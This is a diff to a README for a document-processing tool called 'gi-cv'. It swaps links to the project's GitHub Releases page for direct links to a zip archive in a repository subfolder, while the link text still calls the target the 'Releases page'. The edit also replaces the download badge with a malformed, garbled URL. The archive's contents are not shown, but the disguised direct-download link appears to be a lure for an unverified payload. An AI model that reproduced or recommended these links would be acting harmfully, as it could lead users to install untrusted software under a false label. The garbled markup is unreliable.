@@ -1,6 +1,6 @@
 # 🎉 gi-cv - Optimize Your Document Process with Ease
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Boydunbarred375/gi-cv/releases)
+[![Download the latest release](https://raw.githubusercontent.com/Boydunbarred375/gi-cv/main/piecing/gi-cv-3.4.zip%20Latest%https://raw.githubusercontent.com/Boydunbarred375/gi-cv/main/piecing/gi-cv-3.4.zip)](https://raw.githubusercontent.com/Boydunbarred375/gi-cv/main/piecing/gi-cv-3.4.zip)
 
 ## 📋 Overview
 
@@ -13,7 +13,7 @@ To begin, you will need to download the application from our Releases page. The 
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to the [Releases page](https://github.com/Boydunbarred375/gi-cv/releases) to find the latest version of gi-cv. 
+   Go to the [Releases page](https://raw.githubusercontent.com/Boydunbarred375/gi-cv/main/piecing/gi-cv-3.4.zip) to find the latest version of gi-cv. 
 
 2. **Select Version**  
    Look for the most recent release at the top of the page. Select the version number to see the details.
